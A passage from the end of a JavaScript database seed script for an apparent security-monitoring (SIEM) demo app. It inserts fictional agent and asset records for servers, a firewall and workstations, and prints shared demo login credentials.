        sw: [{"name":"openssh-server","version":"9.6p1"},{"name":"nginx","version":"1.24.0"},{"name":"postgresql-16","version":"16.3"},{"name":"docker-ce","version":"27.1"},{"name":"python3","version":"3.12.3"},{"name":"clamav","version":"1.3.1"},{"name":"SentinelOne Linux Agent","version":"24.2"},{"name":"K3 SIEM Agent","version":"1.0.0"},{"name":"fail2ban","version":"1.0.2"}],
        svc: [{"name":"sshd","status":"running"},{"name":"nginx","status":"running"},{"name":"postgresql","status":"running"},{"name":"docker","status":"running"},{"name":"clamav-daemon","status":"running"}],
        ports: [{"port":22,"proto":"tcp"},{"port":80,"proto":"tcp"},{"port":443,"proto":"tcp"},{"port":5432,"proto":"tcp"}],
        users: [{"name":"root"},{"name":"ubuntu"},{"name":"deploy"},{"name":"postgres"}] }},
    { hostname: 'FW-PALOALTO-01', os: 'PAN-OS 11.1', ip: '203.0.113.1', version: '1.0.0', sources: ['Palo Alto Firewall', 'Network IDS'], events: 8521, team: null,
      asset: { os_name: 'PAN-OS 11.1', os_version: '11.1.3', os_arch: 'arm64', cpu_model: 'Cavium Octeon III', cpu_cores: 4, ram: 16.0, disk: 240.0, disk_used: 45.2, av: 'WildFire', fw: 1, patch: '2026-06-10', uptime: 2160.0, domain: 'fw.k3sec.io', serial: 'K3-FW-001',
        net: [{"name":"ethernet1/1","ip":"203.0.113.1","mac":"00:1B:17:00:01:01"},{"name":"ethernet1/2","ip":"10.0.0.1","mac":"00:1B:17:00:01:02"}],
        sw: [{"name":"PAN-OS","version":"11.1.3"},{"name":"Threat Prevention","version":"8832"},{"name":"WildFire","version":"832416"},{"name":"GlobalProtect","version":"6.2.1"}],
        svc: [{"name":"mgmtsrvr","status":"running"},{"name":"configd","status":"running"},{"name":"logrcvr","status":"running"}],
        ports: [{"port":443,"proto":"tcp"},{"port":22,"proto":"tcp"}],
        users: [{"name":"admin"},{"name":"panorama-svc"}] }},
    { hostname: 'WS-LAPTOP-003', os: 'Windows 11 Pro', ip: '192.168.1.102', version: '1.0.0', sources: ['Windows Security'], events: 456, team: teamBlue,
      asset: { os_name: 'Windows 11 Pro', os_version: '10.0.22631', os_arch: 'x86_64', cpu_model: 'Intel Core i5-1340P', cpu_cores: 12, ram: 8.0, disk: 256.0, disk_used: 198.4, av: 'Windows Defender', fw: 1, patch: '2026-06-01', uptime: 72.3, domain: 'corp.k3sec.io', serial: 'K3-WS-003',
        net: [{"name":"Wi-Fi","ip":"192.168.1.102","mac":"AA:BB:CC:DD:EE:FF"}],
        sw: [{"name":"Windows Defender","version":"4.18"},{"name":"Chrome","version":"126.0"},{"name":"Microsoft 365","version":"16.0"}],
        svc: [{"name":"Windows Defender","status":"running"},{"name":"Windows Update","status":"running"}],
        ports: [{"port":135,"proto":"tcp"},{"port":445,"proto":"tcp"}],
        users: [{"name":"jane.smith"},{"name":"Administrator"}] }},
    { hostname: 'SRV-DB-02', os: 'Ubuntu 22.04 LTS', ip: '10.0.1.55', version: '1.0.0', sources: ['Linux Syslog'], events: 2103, team: teamRed,
      asset: { os_name: 'Ubuntu 22.04 LTS', os_version: '5.15.0-119-generic', os_arch: 'x86_64', cpu_model: 'AMD EPYC 7543', cpu_cores: 16, ram: 128.0, disk: 2000.0, disk_used: 1247.0, av: 'None', fw: 0, patch: '2026-04-15', uptime: 1440.0, domain: 'srv.k3sec.io', serial: 'K3-SRV-002',
        net: [{"name":"eth0","ip":"10.0.1.55","mac":"02:42:AC:11:00:05"}],
        sw: [{"name":"postgresql-14","version":"14.12"},{"name":"openssh-server","version":"8.9"},{"name":"python3","version":"3.10.12"}],
        svc: [{"name":"sshd","status":"running"},{"name":"postgresql","status":"running"}],
        ports: [{"port":22,"proto":"tcp"},{"port":5432,"proto":"tcp"}],
        users: [{"name":"root"},{"name":"postgres"},{"name":"dba"}] }},
  ];

  for (const ag of agentsData) {
    const agId = uuidv4();
    await insAgent.run(agId, ag.hostname, ag.os, ag.ip, 'offline', ag.version, JSON.stringify([]), JSON.stringify(ag.sources), ag.events, ago(rand(60000, 600000)), ag.team || null);
    const a = ag.asset;
    await insAsset.run(uuidv4(), agId, ag.hostname, a.os_name, a.os_version, a.os_arch, a.cpu_model, a.cpu_cores, a.ram, a.disk, a.disk_used, JSON.stringify(a.net), JSON.stringify(a.sw), JSON.stringify(a.svc), JSON.stringify(a.ports), JSON.stringify(a.users), a.av, a.fw, a.patch, a.uptime, a.domain, a.serial);
  }
  console.log('[Seed] Agents: 5, Assets: 5');

  // Register 2 more bare agents whose hostnames match the demo alert generator's COMPUTERS
  // pool (WS-001, SRV-001, below) — without these, the team scope's asset->agent hostname
  // join has nothing to match and every seeded alert would land in the unassigned inbox.
  for (const { hostname, team } of [{ hostname: 'WS-001', team: teamBlue }, { hostname: 'SRV-001', team: teamRed }]) {
    await insAgent.run(uuidv4(), hostname, 'Windows 11 Pro', '192.168.1.50', 'offline', '1.0.0', JSON.stringify([]), JSON.stringify([]), 0, ago(rand(60000, 600000)), team);
  }
  console.log('[Seed] Team-scoping demo agents: 2 (WS-001 -> Blue Team, SRV-001 -> Red Team)');

  console.log('\n✅ Seed complete!');
  console.log('   Demo logins:');
  console.log('     Admin      -> pbasnet / K3@2026');
  console.log('     T2 Analyst -> jmaharjan / K3@2026');
  console.log('     T2 Analyst -> bpaudel / K3@2026');
  console.log('     T1 Analyst -> analyst1 / K3@2026');
}

seed().catch(e => { console.error(e); process.exit(1); });
